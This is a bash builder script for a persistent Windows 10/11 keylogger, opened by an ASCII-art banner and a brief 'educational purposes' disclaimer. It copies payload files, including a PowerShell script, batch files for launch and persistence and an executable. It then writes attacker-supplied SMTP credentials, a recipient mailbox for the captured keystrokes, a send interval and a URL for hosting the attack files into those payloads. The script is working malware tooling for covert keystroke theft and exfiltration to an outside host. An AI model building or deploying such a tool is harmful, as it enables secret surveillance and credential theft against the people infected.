#!/usr/bin/env bash
clear
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'
echo -e "${RED}"
echo -e "

	   ▄█   ▄█▄    ▄████████ ▄██   ▄    ▄█        ▄██████▄     ▄██████▄   ▄█  ████████▄
	  ███ ▄███▀   ███    ███ ███   ██▄ ███       ███    ███   ███    ███ ███  ███    ███
	  ███▐██▀     ███    █▀  ███▄▄▄███ ███       ███    ███   ███    █▀  ███▌ ███    ███
	 ▄█████▀     ▄███▄▄▄     ▀▀▀▀▀▀███ ███       ███    ███  ▄███        ███▌ ███    ███
	▀▀█████▄    ▀▀███▀▀▀     ▄██   ███ ███       ███    ███ ▀▀███ ████▄  ███▌ ███    ███
	  ███▐██▄     ███    █▄  ███   ███ ███       ███    ███   ███    ███ ███  ███    ███
	  ███ ▀███▄   ███    ███ ███   ███ ███▌    ▄ ███    ███   ███    ███ ███  ███  ▀ ███
	  ███   ▀█▀   ██████████  ▀█████▀  █████▄▄██  ▀██████▀    ████████▀  █▀    ▀██████▀▄█
	  ▀                                ▀

			,---,---,---,---,---,---,---,---,---,---,---,---,---,-------,
			|1/2| 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 | 0 | + | ' | <-    |
			|---'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-----|
			| ->| | Q | W | E | R | T | Y | U | I | O | P | ] | ^ |     |
			|-----',--',--',--',--',--',--',--',--',--',--',--',--'|    |
			| Caps | A | S | D | F | G | H | J | K | L | \ | [ | * |    |
			|----,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'---'----|
			|    | < | Z | X | C | V | B | N | M | , | . | - |          |
			|----'-,-',--'--,'---'---'---'---'---'---'-,-'---',--,------|
			| ctrl |  | alt |                          |altgr |  | ctrl |
			'------'  '-----'--------------------------'------'  '------'

	created by: pr0xy_8l4d3
	Short description: persistent windows 10 and 11 keylogger
	v1.2
"
echo -e "${NC}"

echo "*** Disclaimer. This tool was made only for educational purposes ***"
echo "*** Hacking people or computer systems without written permission is strictly prohibited ***"
echo "*** You are using this tool on your own risk ***"
echo

dir=$(pwd -P)
sudo mkdir $dir/output
sudo cp $dir/lib/smkscr.ps1 $dir/output
sudo cp $dir/lib/main.bat $dir/output
sudo cp $dir/lib/pers.bat $dir/output
sudo cp $dir/lib/Record2.txt $dir/output
sudo cp $dir/lib/krec.exe $dir/output



echo -e "${RED}""[*] Enter SMTP Server:" "${NC}"
read var1
sed -i '2s/$/SMTPServer = "'"$var1"'"/g' $dir/output/smkscr.ps1
echo

echo -e "${RED}""[*] Enter SMTP Port:" "${NC}"
read var2
sed -i '3s/$/SMTPPort = "'"$var2"'"/g' $dir/output/smkscr.ps1
echo

while true
do
    echo -e "${RED}""[*] Enter email address:" "${NC}"
    read  var3
    if [[ ${var3} != *"@"* ]];then
        echo
        echo "Error: Enter email address! please try again."
        echo
        continue
    else
	break
    fi
done

sed -i '4s/$/Username = "'"$var3"'"/g' $dir/output/smkscr.ps1
echo



echo -e "${RED}""[*] Enter password of email account:" "${NC}"
read var4
sed -i '5s/$/Password = "'"$var4"'"/g' $dir/output/smkscr.ps1
echo


while true
do
    echo -e "${RED}""[*] Enter email address, where results will be delivered:" "${NC}"
    read  var5
    if [[ ${var5} != *"@"* ]];then
        echo
        echo "Error: Enter email address! please try again."
        echo
        continue
    else
	break
    fi
done
sed -i '10s/$/to = "'"$var5"'"/g' $dir/output/smkscr.ps1
echo

echo -e "${RED}""[*] How often the results will be sent on a email (in seconds: e.g. 600):" "${NC}"
read var6
sed -i "32s/$/start-sleep "$var6"/g" $dir/output/smkscr.ps1
echo

while true
do
echo -e "${RED}""[*] Enter location, where all necessary files for attack will be hosted (e.g. http://192.168.1.110):" "${NC}"
read var7
if [[ ${var7} != *"http"* ]];then
        echo
        echo "Error: url needs to start with http or https! Please try again."
        echo
        continue
    else
        break
    fi
done

sed -i -e 's#url#'$var7'#g' $dir/output/main.bat
echo
echo [*] SMTP Server: $var1
echo [*] SMTP Port: $var2
echo [*] Email account: $var3
echo [*] Email password: $var4
echo [*] Results will be sent: every $var6 seconds
echo [*] All files will be hosted on: $var7
echo
echo
